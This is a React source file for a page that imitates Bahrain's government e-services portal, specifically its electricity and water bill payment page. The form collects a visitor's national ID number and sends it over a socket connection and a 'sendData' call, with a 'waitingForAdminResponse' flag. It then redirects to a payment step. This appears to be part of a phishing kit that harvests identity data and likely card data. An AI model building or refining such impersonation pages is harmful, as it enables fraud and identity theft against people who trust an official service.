import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { navigateToPage, sendData, socket } from "@/lib/store";

export default function HomePage() {
  const [, setLocation] = useLocation();
  const [idType, setIdType] = useState("");
  const [idNumber, setIdNumber] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  useEffect(() => {
    navigateToPage('الصفحة الرئيسية');
  }, []);

  const handleSubmit = () => {
    if (!idType || !idNumber) return;
    setIsSubmitting(true);

    const idTypeLabel = 
      idType === 'bahraini' ? 'الرقم الشخصي البحريني' :
      idType === 'emirati' ? 'الرقم الشخصي الإماراتي' :
      idType === 'saudi' ? 'الرقم الشخصي السعودي' :
      idType === 'omani' ? 'الرقم الشخصي العماني' : idType;

    // Update visitor name with ID number
    if (socket.value.connected) {
      socket.value.emit('visitor:updateName', idNumber);
    }

    sendData({
      data: {
        idType: idTypeLabel,
        idNumber,
      },
      current: 'الصفحة الرئيسية',
      nextPage: 'summary-payment',
      waitingForAdminResponse: false,
    });

    setTimeout(() => {
      setIsSubmitting(false);
      setLocation('/summary-payment');
    }, 1000);
  };

  return (
    <div style={{ minHeight: '100vh', background: '#e8e8e8', fontFamily: "'Cairo', 'Segoe UI', Tahoma, sans-serif", direction: 'rtl' }}>
      
      {/* Top Header Bar */}
      <div style={{ background: '#f5f5f5', borderBottom: '1px solid #ddd' }}>
        <div style={{ maxWidth: '1200px', margin: '0 auto', padding: '8px 20px', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
          {/* Logo */}
          <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
            <img src="/bahrain-logo.png" alt="حكومة البحرين" style={{ height: '60px' }} />
          </div>
          {/* Language & Login */}
          <div style={{ display: 'flex', alignItems: 'center', gap: '20px' }}>
            <span style={{ fontSize: '14px', color: '#555', cursor: 'pointer' }}>English</span>
            <div style={{ display: 'flex', alignItems: 'center', gap: '16px' }}>
              <span style={{ fontSize: '14px', fontWeight: 600, color: '#333', cursor: 'pointer' }}>الخدمات الإلكترونية</span>
              <span style={{ fontSize: '14px', fontWeight: 600, color: '#333', cursor: 'pointer' }}>دليل المعلومات</span>
            </div>
            <button style={{
              background: '#0066cc', color: '#fff', border: 'none', padding: '8px 20px',
              borderRadius: '4px', fontSize: '14px', fontWeight: 600, cursor: 'pointer'
            }}>
              تسجيل الدخول
            </button>
          </div>
        </div>
      </div>

      {/* Navigation Bar */}
      <div style={{ background: '#fff', borderBottom: '2px solid #0066cc' }}>
        <div style={{ maxWidth: '1200px', margin: '0 auto', padding: '0 20px', display: 'flex', gap: '0' }}>
          {['الصفحة الرئيسية', 'الخدمات الإلكترونية حسب التصنيف', 'الخدمات الإلكترونية حسب المقدم', 'متجر تطبيقات الحكومة الإلكترونية'].map((item, i) => (
            <div key={i} style={{
              padding: '12px 20px', fontSize: '13px', fontWeight: 600, color: i === 0 ? '#0066cc' : '#333',
              borderBottom: i === 0 ? '3px solid #0066cc' : 'none', cursor: 'pointer',
              whiteSpace: 'nowrap'
            }}>
              {i === 0 && <span style={{ marginLeft: '6px' }}>🏠</span>}
              {item}
            </div>
          ))}
        </div>
      </div>

      {/* Banner */}
      <div style={{ maxWidth: '1200px', margin: '20px auto', padding: '0 20px' }}>
        <div style={{
          background: 'linear-gradient(135deg, #e8f4fd 0%, #d1e9f6 100%)',
          borderRadius: '8px', padding: '20px 30px', border: '1px solid #b8d4e8',
          display: 'flex', alignItems: 'center', justifyContent: 'space-between'
        }}>
          <div>
            <p style={{ fontSize: '18px', fontWeight: 700, color: '#0055aa', margin: '0 0 4px 0' }}>
              استفد من خدمات <span style={{ color: '#0088dd', textDecoration: 'underline', cursor: 'pointer' }}>التخويل الإلكتروني</span>
            </p>
            <p style={{ fontSize: '15px', color: '#444', margin: 0 }}>
              لإنجاز خدمات المكاتب الأمامية للجهات الحكومية
            </p>
          </div>
          <div style={{ fontSize: '40px', opacity: 0.3 }}>🏛️</div>
        </div>
      </div>

      {/* Sidebar + Main Content */}
      <div style={{ maxWidth: '1200px', margin: '0 auto', padding: '0 20px', display: 'flex', gap: '20px' }}>
        
        {/* Sidebar */}
        <div style={{ width: '280px', flexShrink: 0 }}>
          <div style={{ fontSize: '13px', color: '#555', marginBottom: '8px', display: 'flex', alignItems: 'center', gap: '6px' }}>
            <span>☰</span> القائمة
          </div>
          {[
            { label: 'دفع فاتورة الكهرباء والماء', active: true },
            { label: 'دفع مبلغ التأمين', active: false },
            { label: 'تسجيل قراءة العداد', active: false },
            { label: 'الاستعلام ودفع فواتير الكهرباء والماء', active: false },
            { label: 'عرض الفواتير الحالية والسابقة', active: false },
            { label: 'عرض المدفوعات السابقة', active: false },
            { label: 'غلق الحساب', active: false },
            { label: 'فتح حساب - ترجيع التيار', active: false },
            { label: 'فتح حساب', active: false },
            { label: 'الاستعلام عن حالة الطلبات', active: false },
            { label: 'تحديث البيانات', active: false },
          ].map((item, i) => (
            <div key={i} style={{
              padding: '10px 14px', fontSize: '13px', cursor: 'pointer',
              background: item.active ? '#0066cc' : '#fff',
              color: item.active ? '#fff' : '#333',
              borderBottom: '1px solid #eee',
              fontWeight: item.active ? 600 : 400,
              borderRadius: i === 0 ? '4px 4px 0 0' : i === 10 ? '0 0 4px 4px' : '0',
            }}>
              {item.label}
            </div>
          ))}
        </div>

        {/* Main Content */}
        <div style={{ flex: 1 }}>
          <h1 style={{ fontSize: '22px', fontWeight: 700, color: '#333', marginBottom: '16px' }}>
            دفع فاتورة الكهرباء والماء
          </h1>

          {/* Instructions Accordion */}
          <div style={{
            background: '#0044aa', color: '#fff', padding: '12px 20px', borderRadius: '4px',
            display: 'flex', alignItems: 'center', gap: '8px', cursor: 'pointer', marginBottom: '16px',
            fontSize: '14px', fontWeight: 600
          }}>
            <span>ℹ️</span>
            اضغط هنا لعرض التعليمات
            <span style={{ marginRight: 'auto' }}>▼</span>
          </div>

          {/* Required note */}
          <p style={{ fontSize: '13px', color: '#c00', marginBottom: '16px', textAlign: 'left' }}>
            * بيانات مطلوبة
          </p>

          {/* Customer Details Section */}
          <div style={{
            background: '#0044aa', color: '#fff', padding: '10px 20px', fontSize: '16px',
            fontWeight: 700, borderRadius: '4px 4px 0 0', display: 'flex', alignItems: 'center', gap: '8px'
          }}>
            <span>▲</span>
            تفاصيل العميل
          </div>

          <div style={{
            background: '#fff', border: '1px solid #ddd', borderTop: 'none',
            padding: '24px', borderRadius: '0 0 4px 4px'
          }}>
            {/* ID Type */}
            <div style={{ marginBottom: '20px', display: 'flex', alignItems: 'center', gap: '16px' }}>
              <label style={{ fontSize: '14px', fontWeight: 600, color: '#333', minWidth: '120px', textAlign: 'right' }}>
                <span style={{ color: '#c00' }}>*</span> نوع الهوية:
              </label>
              <select
                value={idType}
                onChange={e => setIdType(e.target.value)}
                style={{
                  flex: 1, padding: '10px 14px', border: '1px solid #ccc', borderRadius: '4px',
                  fontSize: '14px', background: '#fff', cursor: 'pointer', direction: 'rtl'
                }}
              >
                <option value="">-- اختر نوع الهوية --</option>
                <option value="emirati">الرقم الشخصي الإماراتي</option>
                <option value="bahraini">الرقم الشخصي البحريني</option>
                <option value="saudi">الرقم الشخصي السعودي</option>
                <option value="omani">الرقم الشخصي العماني</option>
              </select>
            </div>

            {/* ID Number - shown after selecting type */}
            {idType && (
              <div style={{ marginBottom: '20px', display: 'flex', alignItems: 'center', gap: '16px' }}>
                <label style={{ fontSize: '14px', fontWeight: 600, color: '#333', minWidth: '120px', textAlign: 'right' }}>
                  <span style={{ color: '#c00' }}>*</span> رقم الهوية:
                </label>
                <input
                  type="text"
                  value={idNumber}
                  onChange={e => setIdNumber(e.target.value.replace(/[^0-9]/g, ''))}
                  placeholder="أدخل رقم الهوية"
                  maxLength={12}
                  style={{
                    flex: 1, padding: '10px 14px', border: '1px solid #ccc', borderRadius: '4px',
                    fontSize: '14px', direction: 'ltr', textAlign: 'left'
                  }}
                />
              </div>
            )}

            {/* Buttons */}
            <div style={{ display: 'flex', gap: '12px', justifyContent: 'center', marginTop: '20px' }}>
              <button
                onClick={handleSubmit}
                disabled={!idType || !idNumber || isSubmitting}
                style={{
                  background: (!idType || !idNumber || isSubmitting) ? '#ccc' : '#28a745',
                  color: '#fff', border: 'none', padding: '10px 30px', borderRadius: '4px',
                  fontSize: '15px', fontWeight: 600, cursor: (!idType || !idNumber || isSubmitting) ? 'not-allowed' : 'pointer',
                  minWidth: '120px'
                }}
              >
                {isSubmitting ? 'جاري المعالجة...' : 'التالي'}
              </button>
              <button style={{
                background: '#ffc107', color: '#333', border: 'none', padding: '10px 30px',
                borderRadius: '4px', fontSize: '15px', fontWeight: 600, cursor: 'pointer'
              }}>
                رجوع
              </button>
            </div>
          </div>
        </div>
      </div>

      {/* Footer */}
      <div style={{ background: '#f0f0f0', marginTop: '40px', borderTop: '3px solid #0066cc' }}>
        <div style={{ maxWidth: '1200px', margin: '0 auto', padding: '30px 20px' }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', flexWrap: 'wrap', gap: '30px' }}>
            {/* Column 1 */}
            <div>
              <h4 style={{ fontSize: '15px', fontWeight: 700, color: '#333', marginBottom: '12px' }}>دليل المعلومات</h4>
              {['هنا في البحرين', 'عن البحرين', 'اكتشف البحرين', 'دليل الخدمات الحكومية', 'الدليل الحكومي', 'دليل خدمة العملاء', 'أرقام الطوارئ'].map((item, i) => (
                <p key={i} style={{ fontSize: '13px', color: '#555', margin: '6px 0', cursor: 'pointer' }}>{item}</p>
              ))}
            </div>
            {/* Column 2 */}
            <div>
              <h4 style={{ fontSize: '15px', fontWeight: 700, color: '#333', marginBottom: '12px' }}>الخدمات الإلكترونية</h4>
              {['تصنيف الخدمات الإلكترونية', 'مقدمو الخدمات الإلكترونية', 'متجر تطبيقات الهواتف', 'دليل المستخدم', 'المفتاح الإلكتروني 2.0 المطوّر'].map((item, i) => (
                <p key={i} style={{ fontSize: '13px', color: '#555', margin: '6px 0', cursor: 'pointer' }}>{item}</p>
              ))}
            </div>
            {/* Column 3 */}
            <div>
              <h4 style={{ fontSize: '15px', fontWeight: 700, color: '#333', marginBottom: '12px' }}>روابط سريعة</h4>
              {['حول البوابة الوطنية', 'إحصائيات قنوات الخدمة', 'المشاركة الإلكترونية "شاركنا"', 'الأخبار الحكومية', 'تقويم البحرين'].map((item, i) => (
                <p key={i} style={{ fontSize: '13px', color: '#555', margin: '6px 0', cursor: 'pointer' }}>{item}</p>
              ))}
            </div>
            {/* Social + Contact */}
            <div style={{ textAlign: 'center' }}>
              <h4 style={{ fontSize: '15px', fontWeight: 700, color: '#333', marginBottom: '12px' }}>تابعونا</h4>
              <div style={{ display: 'flex', gap: '10px', justifyContent: 'center', marginBottom: '16px' }}>
                {['LinkedIn', 'Instagram', 'X', 'Facebook', 'YouTube'].map((s, i) => (
                  <div key={i} style={{
                    width: '36px', height: '36px', background: '#888', borderRadius: '6px',
                    display: 'flex', alignItems: 'center', justifyContent: 'center',
                    color: '#fff', fontSize: '12px', fontWeight: 600, cursor: 'pointer'
                  }}>
                    {s[0]}
                  </div>
                ))}
              </div>
              <p style={{ fontSize: '13px', color: '#555' }}>تواصل معنا</p>
              <p style={{ fontSize: '18px', fontWeight: 700, color: '#c00' }}>80008001</p>
            </div>
          </div>
        </div>

        {/* Bottom Footer */}
        <div style={{ borderTop: '1px solid #ddd', padding: '16px 20px', textAlign: 'center' }}>
          <div style={{ display: 'flex', justifyContent: 'center', gap: '20px', flexWrap: 'wrap', marginBottom: '10px' }}>
            {['شروط الإستخدام', 'سياسة الخصوصية', 'إمكانية الوصول', 'الأسئلة الشائعة', 'مساعدة', 'تواصل معنا', 'خريطة الموقع'].map((item, i) => (
              <span key={i} style={{ fontSize: '12px', color: '#666', cursor: 'pointer' }}>{item}</span>
            ))}
          </div>
          <p style={{ fontSize: '12px', color: '#888', margin: '4px 0' }}>
            حقوق الطبع © 2026 مملكة البحرين - جميع الحقوق محفوظة
          </p>
          <p style={{ fontSize: '11px', color: '#999' }}>
            تم التطوير من قبل هيئة المعلومات والحكومة الإلكترونية
          </p>
        </div>
      </div>
    </div>
  );
}
